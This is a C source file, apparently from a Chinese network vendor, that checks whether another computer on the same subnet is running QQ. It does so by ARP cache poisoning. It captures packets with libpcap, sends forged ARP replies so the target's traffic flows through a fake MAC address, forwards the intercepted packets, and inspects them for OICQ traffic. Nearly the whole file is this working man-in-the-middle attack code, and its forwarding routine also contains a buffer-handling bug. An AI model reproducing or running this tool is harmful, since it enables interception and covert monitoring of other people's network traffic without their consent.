/*
 * Copyright(C) 2013 Ruijie Network. All rights reserved.
 */
/*
 * check_qq_online.c
 * Original Author: wujincheng@ruijie.com.cn 2013-12-24
 *
 * 检查同网段中某ip是否使用qq
 *
 * History
 */
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "check_qq_online.h"

static struct host_msg hmsg;
static char errbuf[PCAP_ERRBUF_SIZE+1];
static pcap_t *adhandle;
static unsigned char dest_listen_mac[DEF_HLEN];
static unsigned char gateway_mac[DEF_HLEN];
static unsigned char cheat_mac[DEF_HLEN] = {0x00, 0x00, 0x00, 0x01, 0x01, 0x01};
static unsigned char broadcast_mac[DEF_HLEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

static void iptos(u_long in,unsigned char *output)
{
    u_char *p;
    int i;
    p = (u_char *)&in;

    for (i = 0; i < DEF_PLEN; i++) {
        output[i] = p[i];
    }
}

static unsigned int iptoi(const unsigned char *ip_str)
{
    return (((ip_str[3] * 256 + ip_str[2]) * 256 + ip_str[1]) *256 + ip_str[0]);
}

static void debug(char *msg,unsigned char *mes, int len)
{
    int i;

    printf("%s: \n", msg);
    for (i = 0; i < len; i++) {
        if (i == (len - 1)) {
            printf("%.2x", mes[i]);
        } else {
            printf("%.2x-", mes[i]);
        }
    }
    printf("\n");
}
/* 开启混杂模式 */
static bool check_qq_start_promisc(char *eth_name)
{
    adhandle = pcap_open_live(eth_name, 65536, 1, 1000, errbuf);
    if (adhandle == NULL) {
        printf("\nUnable to open the adapter. %s is not supported by WinPcap\n", errbuf);
        return false;
    }

    return true;
}

static bool check_qq_get_hmaddr(struct pcap_pkthdr **header, unsigned char **pkt_data)
{
    int ret;
    struct oicq_packet *buf;
    struct in_addr src_addr;
    int times;

    times = 0;
    inet_pton(AF_INET, (const char *)&hmsg.hmsg_ip, &src_addr);
    while((ret = pcap_next_ex(adhandle,  (struct pcap_pkthdr **)header,
            (const unsigned char **)pkt_data)) >= 0) {
        times++;
        if (ret == 0) {
            continue;
        }
        buf = (struct oicq_packet *)*pkt_data;

        if (memcmp((unsigned char *)&hmsg.hmsg_ip, buf->ip_header.dst_ip, DEF_PLEN) == 0) {
            memcpy(&hmsg.hmsg_mac, buf->eth_header.dmac_addr, DEF_HLEN);
            return true;
        }
    } /* end of while */

    return false;

}

static bool check_qq_ip_issame_network(pcap_if_t *ptr, char *ip)
{
    pcap_addr_t *addr_msg_ptr;
    unsigned int host_ip;
    unsigned int netmask;
    unsigned int target_ip;
    unsigned int ip_mask;
    unsigned int target_ip_mask;
    struct in_addr target_addr;
    int index;

    index = 1;
    inet_pton(AF_INET, (const char *)ip, &target_addr);
    target_ip = iptoi((const unsigned char *)&target_addr);
    for (addr_msg_ptr = ptr->addresses; addr_msg_ptr; addr_msg_ptr=addr_msg_ptr->next) {
        switch (addr_msg_ptr->addr->sa_family) {
        case AF_INET:
            if (addr_msg_ptr->addr && addr_msg_ptr->netmask) {
                index++;
                host_ip = ((struct sockaddr_in *)addr_msg_ptr->addr)->sin_addr.s_addr;
                netmask = ((struct sockaddr_in *)addr_msg_ptr->netmask)->sin_addr.s_addr;
                ip_mask = host_ip & netmask;
                target_ip_mask = target_ip & netmask;
                if (ip_mask == target_ip_mask) {
                    hmsg.hmsg_ifindex = index;
                    memset(hmsg.hmsg_name, 0, DEF_ETH_NAME);
                    memcpy(hmsg.hmsg_name, ptr->name, strlen(ptr->name));
                    iptos(host_ip, hmsg.hmsg_ip);
                    return true;
                }
            }
            break;
        default:
            break;
        }
    } /* end of for */

    return false;
}

static bool check_qq_get_host_msg(char *ip)
{
    pcap_if_t *ptr;
    pcap_if_t *alldevs;

    /* 获得网卡的列表 */
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error in pcap_findalldevs: %s\n", errbuf);
        return false;
    }
    for (ptr = alldevs; ptr; ptr = ptr->next) {
        if (check_qq_ip_issame_network(ptr, ip)) {
            goto exit;
        }
    }
    pcap_freealldevs(alldevs);
    return false;
exit:
    pcap_freealldevs(alldevs);

    return true;

}

static void check_qq_make_arp_pack(struct arp_packet *buf, unsigned char *send_ip,
                unsigned char *dest_ip, unsigned char *send_mac, unsigned char *dest_mac,
                unsigned short operation)
{
    /* ethernet header */
    memset(buf, 0, ARP_PACKET_LEN);
    memcpy(buf->dmac_addr, (const char *)dest_mac, DEF_HLEN);
    memcpy(buf->smac_addr, (const char *)send_mac, DEF_HLEN);
    buf->ether_type = htons(ETH_TYPE_ARP);

    buf->hardware = htons(ARP_DEF_HARDW);
    buf->protocol = htons(ETH_TYPE_IP);
    buf->hardwlen = DEF_HLEN;
    buf->protolen = DEF_PLEN;
    buf->operation = htons(operation);
    memcpy(buf->send_mac, send_mac, DEF_HLEN);
    memcpy(buf->send_ip, send_ip, DEF_PLEN);
    memcpy(buf->targ_mac, dest_mac, DEF_HLEN);
    memcpy(buf->targ_ip, dest_ip, DEF_PLEN);

}

static unsigned char *check_qq_get_tar_mac(char *target_ip, unsigned char *target_mac,
                        unsigned char **buf, struct pcap_pkthdr **header)
{
    int i, ret;
    struct arp_packet arp;
    struct in_addr target_addr;
    struct arp_packet *tmp;

    inet_pton(AF_INET, (const char *)target_ip, &target_addr);
    memset(&arp, 0, ARP_PACKET_LEN);
    (void)check_qq_make_arp_pack(&arp, hmsg.hmsg_ip, (unsigned char *)&target_addr, hmsg.hmsg_mac,
        broadcast_mac, ARP_REQUEST);
    i = 0;
    while ((ret = pcap_next_ex(adhandle,  header, (const unsigned char **)buf)) >= 0) {
        i++;
        pcap_sendpacket(adhandle, (const unsigned char *)&arp, ARP_PACKET_LEN);
        tmp = (struct arp_packet *)(*buf);
        if (memcmp(&target_addr, tmp->send_ip, DEF_PLEN) == 0) {
            memset(target_mac, 0, DEF_HLEN);
            memcpy(target_mac, tmp->send_mac, DEF_HLEN);
            goto exit;
        }
        if (i > 10000) {
            break;
        }
    } /* end of while */
    printf("To commuicate %s address happen error\n", target_ip);
    return NULL;
exit:

    return target_mac;
}

static bool check_qq_chk_param(char *target_ip, char *gateway_ip,unsigned char **buf,
                struct pcap_pkthdr **header)
{
    if (check_qq_get_tar_mac(target_ip, dest_listen_mac, buf, header) == NULL) {
        printf("get your target pc's mac happen error\n");
        return false;
    }
    if (check_qq_get_tar_mac(gateway_ip, gateway_mac, buf, header) == NULL) {
        printf("get your gateway mac happen error\n");
        return false;
    }

    return true;
}

static bool check_qq_init(char *target_ip, struct pcap_pkthdr **header, unsigned char **pkt_data)
{
    if (!check_qq_get_host_msg(target_ip)) {
        printf("check_qq_get_host_msg happen error\n");
        return false;
    }
    debug("your pc ip", hmsg.hmsg_ip, DEF_PLEN);
    if (!check_qq_start_promisc(hmsg.hmsg_name)) {
        return false;
    }
    if (!check_qq_get_hmaddr(header, pkt_data)) {
        printf("check_qq_get_hmaddr happen error\n");
        return false;
    }

    return true;
}

static void check_qq_send_arp( unsigned char *target_ip, unsigned char *gateway_ip,
                unsigned char *smac, unsigned char *dmac, unsigned short opera)
{
    struct in_addr gateway_addr;
    struct in_addr sender_addr;
    struct arp_packet arp;

    inet_pton(AF_INET, (const char *)target_ip, &sender_addr);
    inet_pton(AF_INET, (const char *)gateway_ip, &gateway_addr);
    memset(&arp, 0, ARP_PACKET_LEN);
    check_qq_make_arp_pack(&arp, (uchar *)&sender_addr, (uchar *)&gateway_addr,
        smac, dmac, opera);
    pcap_sendpacket(adhandle, (const unsigned char *)&arp, ARP_PACKET_LEN);

    return ;
}

static bool check_qq_packet_is_tar(unsigned char *buf)
{
    struct oicq_packet *packet;

    packet = (struct oicq_packet *)buf;
    /* memcmp cheating mac */
    if (memcmp(packet->eth_header.dmac_addr, cheat_mac, DEF_HLEN) == 0 ) {
        return true;
    }

    return false;
}

static bool check_qq_packet_is_oicq(unsigned char *buf)
{
    struct oicq_packet *packet;

    packet = (struct oicq_packet *)buf;
    if (check_qq_packet_is_tar(buf)) {
        if (packet->ip_header.protocol == UDP_PRO) {
            if (ntohs(packet->udp_header.sour_port) == OICQ_PORT ) {
                if (packet->oicq_flag == OICQ_FLAG) {
                    return true;
                }
            }
        }
    }

    return false;
}

static void check_qq_farward_packet(unsigned char *buf)
{
    struct oicq_packet *tmp;

    tmp = (struct oicq_packet *)buf;
    if (check_qq_packet_is_tar(buf)) {
        if (ntohs(tmp->eth_header.ether_type) != ETH_TYPE_ARP) {
            memcpy(tmp->eth_header.dmac_addr, dest_listen_mac, DEF_HLEN);
            pcap_sendpacket(adhandle, (const unsigned char *)&buf, ARP_PACKET_LEN);
        }
    }
}

bool check_qq_online(char *listen_ip, char *gateway_ip)
{
    int i, ret;
    unsigned char *buf;
    struct pcap_pkthdr *header;

    if (!check_qq_init(listen_ip, &header, &buf)) {
        pcap_close(adhandle);
        free(buf);
        return false;
    }
    debug("your mac", hmsg.hmsg_mac, DEF_HLEN);
    if (!check_qq_chk_param(listen_ip, gateway_ip, &buf, &header)) {
        pcap_close(adhandle);
        return false;
    }
    debug("listen pc mac", dest_listen_mac, DEF_HLEN);
    debug("gateway  mac", gateway_mac, DEF_HLEN);
    i = 1000000;
    printf("start listen...\n");
    while (i--) {
        ret = pcap_next_ex(adhandle, &header, (const unsigned char **)&buf);
        if (ret <= 0) {
            continue;
        }
        check_qq_send_arp((unsigned char *)listen_ip, (unsigned char *)gateway_ip, cheat_mac,
            gateway_mac, ARP_REPLY);
        if (check_qq_packet_is_oicq(buf)) {
            break;
        }
        check_qq_farward_packet(buf);
    }
    check_qq_send_arp((unsigned char *)listen_ip, (unsigned char *)gateway_ip, dest_listen_mac,
        gateway_mac, ARP_REQUEST);
    pcap_close(adhandle);
    if (i <= 0) {
        printf("listen time is over!\n");
        return false;
    }

    return true;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        printf("\007Usage:%s need three argument \n", argv[0]);
        printf("\007Usage Mode:%s listening-ip gateway-ip\n", argv[0]);
        printf("for example:%s 192.168.204.97 192.168.204.1\n", argv[0]);
        return -1;
     }
    if (argc > 3) {
        printf("\007Usage:%s Only two argument;\n", argv[0]);
        return -1;
    }
    printf("\007%s check %s result:\n", argv[0], argv[1]);
    srand((int)time(0));
    cheat_mac[3] = rand()%255;
    cheat_mac[4] = rand()%255;
    cheat_mac[5] = rand()%255;
    if (check_qq_online(argv[1], argv[2])) {
        printf("That Pc is using qq program!\n");
        return 1;
    }
    printf("That Pc Don't use qq program!\n");

    return 1;
}
